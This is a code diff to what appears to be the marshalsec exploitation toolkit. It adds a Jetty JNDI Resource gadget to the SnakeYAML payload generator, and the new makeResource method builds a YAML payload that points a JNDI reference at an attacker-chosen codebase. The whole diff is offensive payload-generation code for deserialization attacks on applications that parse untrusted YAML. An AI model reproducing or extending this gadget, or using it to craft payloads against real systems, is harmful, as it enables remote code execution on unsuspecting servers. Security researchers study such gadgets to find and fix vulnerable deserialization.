@@ -34,23 +34,15 @@ import javax.naming.InitialContext;
 import javax.naming.Reference;
 import javax.script.ScriptEngineManager;
 
+import marshalsec.gadgets.*;
 import org.apache.commons.configuration.ConfigurationMap;
 import org.apache.commons.configuration.JNDIConfiguration;
 import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
 import org.apache.xbean.naming.context.WritableContext;
+import org.eclipse.jetty.plus.jndi.Resource;
 import org.springframework.beans.factory.config.PropertyPathFactoryBean;
 import org.springframework.jndi.support.SimpleJndiBeanFactory;
 import org.yaml.snakeyaml.Yaml;
-
-import marshalsec.gadgets.Args;
-import marshalsec.gadgets.C3P0RefDataSource;
-import marshalsec.gadgets.C3P0WrapperConnPool;
-import marshalsec.gadgets.CommonsConfiguration;
-import marshalsec.gadgets.JdbcRowSet;
-import marshalsec.gadgets.ScriptEngine;
-import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
-import marshalsec.gadgets.SpringPropertyPathFactory;
-import marshalsec.gadgets.XBean;
 
 
 /**
@@ -65,7 +57,7 @@ import marshalsec.gadgets.XBean;
  *
  */
 public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, CommonsConfiguration, C3P0RefDataSource, C3P0WrapperConnPool,
-        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean {
+        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, ResourceGadget {
 
     /**
      * {@inheritDoc}
@@ -172,6 +164,21 @@ public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, Com
                 writeString("foo"),
                 writeConstructor(Reference.class, true, "foo", writeString(args[ 1 ]), writeString(args[ 0 ])),
                 writeConstructor(WritableContext.class, true)));
+    }
+
+    @Override
+    @Args ( minArgs = 1, args = {
+            "codebase"
+    }, defaultArgs = {
+            MarshallerBase.defaultCodebase
+    } )
+    public Object makeResource(UtilFactory uf, String[] args) throws Exception {
+        return writeConstructor(
+                Resource.class,
+                true,
+                writeString(args[0]),
+                writeConstructor(Object.class, true)
+        ) ;
     }
 
 
